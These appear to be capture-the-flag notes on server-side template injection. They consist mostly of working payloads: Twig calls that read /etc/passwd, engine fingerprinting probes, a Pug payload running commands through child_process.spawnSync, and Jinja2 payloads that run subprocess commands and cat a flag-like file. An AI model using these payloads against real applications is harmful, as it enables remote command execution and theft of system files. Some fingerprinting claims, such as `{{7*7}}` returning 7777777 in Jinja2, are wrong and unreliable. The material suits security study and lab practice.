
**Identifying what is allowed**
{{ include('/etc/passwd') }}
{{ source('/etc/passwd') }}

twig/php needs a second element comparator gets triggered

**Detecting the Engine**

Inject `{{7*7}}` and test for jinja2
- Response: 7777777 

Inject {{7*'7'}} to test for Twig or Jinja
- Response 49 = Twig
- Response 7777777 = Jinja2


Payload : #{77} works on Jade/pug due to its different handling of syntax (returns 49)
Payload #{7 * 7}  confirms Pug is running 

Quick check for RCE
{system("ls")}


payload: 
`#{root.process.mainModule.require('child_process').spawnSync('ls').stdout}`

Important functions to understand to exploit SSTi
- SpawnSync

**SpawnSync signature :** 
```javascript
spawnSync(command, [args], [options])
```

Example Usage:
```javascript
const { spawnSync } = require('child_process');
const result = spawnSync('ls', ['-lah']);
console.log(result.stdout.toString());
```

**Explanation of Example Usage:** 
In this corrected form:

- **'ls'** is the command.
- **['-lah']** is an array containing all arguments passed to the command.

This structure ensures that the `ls` command is called with `-lah` as its argument, allowing the command to function as intended. So, the final payload will then be 
#{root.process.mainModule.require('child_process').spawnSync('ls', ['-lah']).stdout}

**Example Usage of Payload for Jinja2**
`{{"".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get("__builtins__").get("__import__")("subprocess").check_output(['ls', '-lah'])}}`


`{{"".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get("__builtins__").get("__import__")("subprocess").check_output(['cat', '5d8bea6df83cbb6767a235c4ba54933b.txt'])}}`

